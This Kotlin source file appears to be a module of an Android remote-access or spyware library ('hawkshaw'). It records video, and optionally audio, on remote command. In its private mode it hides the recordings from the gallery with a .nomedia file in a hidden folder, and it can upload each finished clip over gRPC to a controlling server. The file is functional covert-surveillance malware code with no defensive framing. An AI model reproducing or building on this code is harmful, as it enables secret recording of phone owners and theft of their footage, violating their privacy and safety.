package com.hawkshaw.library.features.media.camera

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.Log // Added for Android logging
import androidx.camera.core.CameraSelector
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.MediaStoreOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.features.media.filecrud.pushFile
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

private const val FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS"
private const val FILE_EXTENSION = ".mp4"
private const val TAG = "CameraXVideo"

/**
 * Get output file for video recording
 */
private fun getOutputFile(context: Context, saveToPrivate: Boolean): File {
    Log.d(TAG, "[DEBUG] getOutputFile called. Context: $context, saveToPrivate: $saveToPrivate")
    val directory: File = if (saveToPrivate) {
        var dir = Environment.getExternalStoragePublicDirectory(".camera")
        val externalFilesDir = context.getExternalFilesDir(".camera")
        if (externalFilesDir != null) {
            Log.d(TAG, "[DEBUG] getOutputFile: Using externalFilesDir: ${externalFilesDir.absolutePath}")
            dir = externalFilesDir
        } else {
            Log.d(TAG, "[DEBUG] getOutputFile: Using public directory: ${dir.absolutePath}")
        }
        
        if (!dir.exists()) {
            Log.d(TAG, "[DEBUG] getOutputFile: Directory does not exist, creating: ${dir.absolutePath}")
            dir.mkdirs()
        }
        
        // Create .nomedia file to hide from gallery
        val nomediaFile = File(dir, ".nomedia")
        if (!nomediaFile.exists()) {
            Log.d(TAG, "[DEBUG] getOutputFile: .nomedia file does not exist, creating: ${nomediaFile.absolutePath}")
            nomediaFile.createNewFile()
        }
        
        dir
    } else {
        val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        Log.d(TAG, "[DEBUG] getOutputFile: Saving to public DCIM directory: ${dir.absolutePath}")
        if (!dir.exists()) {
            Log.d(TAG, "[DEBUG] getOutputFile: DCIM directory does not exist, creating: ${dir.absolutePath}")
            dir.mkdirs()
        }
        dir
    }
    Log.d(TAG, "[DEBUG] getOutputFile: Selected directory: ${directory.absolutePath}")

    val timestamp = SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault())
        .format(System.currentTimeMillis())
    
    val outputFile = File(directory, "$timestamp$FILE_EXTENSION")
    Log.d(TAG, "[DEBUG] getOutputFile: Final output file: ${outputFile.absolutePath}")
    return outputFile
}

/**
 * Check if audio recording permission is granted
 */
private fun hasAudioPermission(context: Context): Boolean {
    Log.d(TAG, "[DEBUG] hasAudioPermission called. Context: $context")
    val permissionGranted = ContextCompat.checkSelfPermission(
        context,
        Manifest.permission.RECORD_AUDIO
    ) == PackageManager.PERMISSION_GRANTED
    Log.d(TAG, "[DEBUG] hasAudioPermission: RECORD_AUDIO permission granted: $permissionGranted")
    return permissionGranted
}

/**
 * Record video with CameraX
 */
suspend fun recordVideo(
    context: Context,
    lifecycleOwner: LifecycleOwner,
    request: Command.RecordVideoRequest,
    cameraProviderFuture: ProcessCameraProvider? = null
): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] recordVideo called. Request: $request, cameraProviderFuture provided: ${cameraProviderFuture != null}")
    // Existing Logger.d is fine for this general entry.
    Logger.d(TAG, "Record Video called", false, 4, null)
    
    // Setup executor for camera operations
    val cameraExecutor = Executors.newSingleThreadExecutor()
    Log.d(TAG, "[DEBUG] recordVideo: Camera executor created.")
    var cameraProvider: ProcessCameraProvider? = null

    try {
        // Configure camera selector based on lens facing direction
        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(request.mLensFacing)
            .build()
        Log.d(TAG, "[DEBUG] recordVideo: CameraSelector created. Lens facing: ${request.mLensFacing}")

        // Configure quality selector with multiple qualities
        val quality = when (request.videoFrameRate) {
            in 0..24 -> Quality.SD
            in 25..30 -> Quality.HD
            else -> Quality.FHD
        }
        Log.d(TAG, "[DEBUG] recordVideo: Selected video quality: $quality based on frame rate: ${request.videoFrameRate}")

        // Configure recorder with quality settings
        val recorder = Recorder.Builder()
            .setQualitySelector(QualitySelector.from(quality))
            .build()
        Log.d(TAG, "[DEBUG] recordVideo: Recorder created with quality selector for $quality.")

        // Create VideoCapture use case with the recorder
        val videoCapture = VideoCapture.withOutput(recorder)
            .apply {
                // Set target rotation if provided
                request.mRotation?.let {
                    targetRotation = it
                    Log.d(TAG, "[DEBUG] recordVideo: VideoCapture target rotation set to: $it")
                }
            }
        Log.d(TAG, "[DEBUG] recordVideo: VideoCapture use case created.")

        // Get camera provider
        cameraProvider = cameraProviderFuture ?: ProcessCameraProvider.getInstance(context).get()
        Log.d(TAG, "[DEBUG] recordVideo: CameraProvider instance obtained: $cameraProvider")

        // Unbind all use cases before binding new ones
        Log.d(TAG, "[DEBUG] recordVideo: Calling cameraProvider.unbindAll().")
        cameraProvider?.unbindAll()

        // Bind use cases to camera (remove unused Camera reference)
        Log.d(TAG, "[DEBUG] recordVideo: Calling cameraProvider.bindToLifecycle().")
        cameraProvider?.bindToLifecycle(
            lifecycleOwner,
            cameraSelector,
            videoCapture
        ) ?: run {
            Log.e(TAG, "[DEBUG] recordVideo: Failed to bind camera use cases. CameraProvider or LifecycleOwner might be null.")
            throw IllegalStateException("Failed to bind camera use cases")
        }
        Log.d(TAG, "[DEBUG] recordVideo: Camera use cases bound to lifecycle.")

        // Create output file
        val outputFile = getOutputFile(context, request.saveToPrivate)
        Log.d(TAG, "[DEBUG] recordVideo: Output file created: ${outputFile.absolutePath}")

        // Configure media store output options
        val mediaStoreOutput = MediaStoreOutputOptions.Builder(
            context.contentResolver,
            android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        )
            .setContentValues(android.content.ContentValues().apply {
                put(android.provider.MediaStore.MediaColumns.DISPLAY_NAME, outputFile.name)
                put(android.provider.MediaStore.MediaColumns.MIME_TYPE, "video/mp4")
                put(android.provider.MediaStore.MediaColumns.RELATIVE_PATH, outputFile.parentFile?.name)
                Log.d(TAG, "[DEBUG] recordVideo: MediaStore ContentValues: DisplayName=${outputFile.name}, MimeType=video/mp4, RelativePath=${outputFile.parentFile?.name}")
            })
            .build()
        Log.d(TAG, "[DEBUG] recordVideo: MediaStoreOutputOptions built.")

        // Start recording with audio if enabled and permission granted
        Log.d(TAG, "[DEBUG] recordVideo: Preparing recording.")
        val recording = try {
            videoCapture.output
                .prepareRecording(context, mediaStoreOutput)
                .apply {
                    Log.d(TAG, "[DEBUG] recordVideo: Audio enabled in request: ${request.audioEnabled}")
                    if (request.audioEnabled && hasAudioPermission(context)) {
                        Log.d(TAG, "[DEBUG] recordVideo: Audio enabled and permission granted. Calling withAudioEnabled().")
                        withAudioEnabled()
                    } else if (request.audioEnabled) {
                        Log.w(TAG, "[DEBUG] recordVideo: Audio recording requested but permission not granted.")
                        // Existing Logger.w is fine.
                        Logger.w(TAG, "Audio recording requested but permission not granted")
                    } else {
                        Log.d(TAG, "[DEBUG] recordVideo: Audio not enabled in request.")
                    }
                }
                .start(ContextCompat.getMainExecutor(context)) { event ->
                    Log.d(TAG, "[DEBUG] recordVideo: VideoRecordEvent received: $event")
                    when (event) {
                        is VideoRecordEvent.Start -> {
                            Log.d(TAG, "[DEBUG] recordVideo: Recording started event.")
                            // Existing Logger.d is fine.
                            Logger.d(TAG, "Recording started", false, 4, null)
                        }
                        is VideoRecordEvent.Finalize -> {
                            Log.d(TAG, "[DEBUG] recordVideo: Recording finalize event. Has error: ${event.hasError()}")
                            if (event.hasError()) {
                                Log.e(TAG, "[DEBUG] recordVideo: Video recording error: ${event.error}, Cause: ${event.cause}")
                                // Existing Logger.e is fine.
                                Logger.e(
                                    TAG,
                                    "Video recording error: ${event.error}",
                                    b = false,
                                    i = 12,
                                    nothing = null
                                )
                            } else {
                                Log.d(TAG, "[DEBUG] recordVideo: Recording saved successfully to: ${outputFile.absolutePath}")
                                // Existing Logger.d is fine.
                                Logger.d(
                                    TAG,
                                    "Recording saved to: ${outputFile.absolutePath}",
                                    false,
                                    4,
                                    null
                                )

                                // Push video file if needed
                                Log.d(TAG, "[DEBUG] recordVideo: Push file requested: ${request.pushFile}, Output file exists: ${outputFile.exists()}")
                                if (request.pushFile && outputFile.exists()) {
                                    try {
                                        val fileRequest = Command.FileRequest(
                                            path = outputFile.absolutePath,
                                            source = Command.FileRequest.Source.VideoRecording,
                                            medium = Command.FileRequest.Medium.Grpc,
                                            buffer = request.buffer ?: (512 * 1024)
                                        )
                                        Log.d(TAG, "[DEBUG] recordVideo: Created FileRequest for push: $fileRequest")
                                        CoroutineScope(Dispatchers.IO).launch {
                                            Log.d(TAG, "[DEBUG] recordVideo: Launching pushFile coroutine.")
                                            pushFile(fileRequest)
                                            Log.d(TAG, "[DEBUG] recordVideo: pushFile coroutine completed.")
                                        }
                                    } catch (e: Exception) {
                                        Log.e(TAG, "[DEBUG] recordVideo: Failed to push video file: ${e.message}", e)
                                        // Existing Logger.e is fine.
                                        Logger.e(
                                            TAG,
                                            "Failed to push video file: ${e.message}",
                                            e,
                                            false,
                                            12,
                                            null
                                        )
                                    }
                                }
                            }

                            // Release resources
                            Log.d(TAG, "[DEBUG] recordVideo: VideoRecordEvent.Finalize - Calling releaseResources.")
                            releaseResources(cameraExecutor, cameraProvider)
                        }
                    }
                }
        } catch (e: SecurityException) {
            Log.e(TAG, "[DEBUG] recordVideo: Security exception while preparing/starting recording: ${e.message}", e)
            // Existing Logger.e is fine.
            Logger.e(
                TAG,
                "Security exception while preparing recording: ${e.message}",
                e,
                false,
                12,
                null
            )
            Log.d(TAG, "[DEBUG] recordVideo: SecurityException - Calling releaseResources.")
            releaseResources(cameraExecutor, cameraProvider)
            throw e
        }
        Log.d(TAG, "[DEBUG] recordVideo: Recording started or prepared: $recording")

        // Wait for specified duration
        val recordingDuration = request.recordingDuration
        Log.d(TAG, "[DEBUG] recordVideo: Requested recording duration: $recordingDuration ms.")
        if (recordingDuration > 0) {
            Log.d(TAG, "[DEBUG] recordVideo: Delaying for $recordingDuration ms.")
            delay(recordingDuration)
            Log.d(TAG, "[DEBUG] recordVideo: Delay finished. Stopping recording.")
            recording.stop()
            Log.d(TAG, "[DEBUG] recordVideo: Recording stopped via duration.")
        }

        Log.d(TAG, "[DEBUG] recordVideo: Returning recording object: $recording")
        return@withContext recording
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] recordVideo: Error during video recording: ${e.message}", e)
        // Existing Logger.e is fine.
        Logger.e(TAG, "Error recording video: ${e.message}", e, false, 12, null)
        Log.d(TAG, "[DEBUG] recordVideo: General Exception - Calling releaseResources.")
        releaseResources(cameraExecutor, cameraProvider)
        throw e
    }
}

/**
 * Release camera resources
 */
private fun releaseResources(
    cameraExecutor: ExecutorService,
    cameraProvider: ProcessCameraProvider?
) {
    Log.d(TAG, "[DEBUG] releaseResources called. CameraProvider null: ${cameraProvider == null}")
    cameraExecutor.shutdown()
    Log.d(TAG, "[DEBUG] releaseResources: CameraExecutor shutdown initiated.")
    try {
        if (!cameraExecutor.awaitTermination(1000, TimeUnit.MILLISECONDS)) {
            Log.w(TAG, "[DEBUG] releaseResources: CameraExecutor did not terminate in 1s. Calling shutdownNow().")
            cameraExecutor.shutdownNow()
        } else {
            Log.d(TAG, "[DEBUG] releaseResources: CameraExecutor terminated successfully.")
        }
    } catch (e: InterruptedException) {
        Log.w(TAG, "[DEBUG] releaseResources: InterruptedException during awaitTermination. Calling shutdownNow().", e)
        cameraExecutor.shutdownNow()
        Thread.currentThread().interrupt() // Preserve interrupt status
    }
    
    // Release camera on main thread
    cameraProvider?.let {
        Log.d(TAG, "[DEBUG] releaseResources: Posting unbindAll to main looper for provider: $it")
        Handler(Looper.getMainLooper()).post {
            try {
                Log.d(TAG, "[DEBUG] releaseResources: Executing unbindAll on main thread.")
                it.unbindAll()
                Log.d(TAG, "[DEBUG] releaseResources: unbindAll successful on main thread.")
            } catch (e: Exception) {
                Log.e(TAG, "[DEBUG] releaseResources: Error unbinding camera on main thread: ${e.message}", e)
                // Existing Logger.e is fine.
                Logger.e(TAG, "Error unbinding camera: ${e.message}", e, false, 12, null)
            }
        }
    } ?: Log.d(TAG, "[DEBUG] releaseResources: CameraProvider is null, skipping unbindAll.")
}
